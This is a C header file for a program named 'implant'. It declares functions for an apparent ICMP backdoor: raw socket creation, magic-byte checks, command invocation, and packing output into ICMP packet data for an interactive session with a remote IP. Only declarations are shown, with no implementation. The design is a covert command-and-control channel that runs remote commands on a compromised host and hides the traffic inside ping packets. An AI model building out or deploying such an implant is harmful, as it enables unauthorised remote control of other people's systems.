#ifndef implant_H
#define implant_H

#include <netinet/ip_icmp.h>
#define BUFFER_SIZE 1472

void implant_init_n_call(char *dest_ip);
int read_from_socket(int sockfd, unsigned char *buffer, int size);
int create_socket(void);
int check_magic_byte(struct icmphdr *icmp);
size_t invoke_command(unsigned char *data, unsigned char *output);
void interact(int sockfd, char *dest_ip);
struct sockaddr_in prep_ip_headers(struct iphdr *ip);
unsigned char *parse_data_section(unsigned char *packet);
void prep_icmp_headers(struct icmphdr *icmp, unsigned char *data, uint16_t checksum);
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input);

#endif